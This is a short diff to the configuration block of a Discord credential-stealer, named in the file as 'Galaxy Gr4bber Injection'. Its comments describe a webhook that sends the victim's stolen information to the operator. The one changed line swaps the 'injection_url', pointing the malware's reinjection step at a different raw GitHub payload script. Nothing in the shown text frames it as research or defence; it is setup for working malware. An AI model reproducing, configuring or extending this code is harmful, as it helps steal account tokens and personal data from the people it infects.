@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Galaxy Gr4bber Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1165868599815184476/1166384260236722226/discord-avatar-512-4AI0U.png?ex=654a4afe&is=6537d5fe&hm=92ff4cd0e0829a9d2283b01c28be72b037b014d8eb16151a117a59c46147f3b4&', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/adamtheexploitr/galaxy.cum.github.io/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
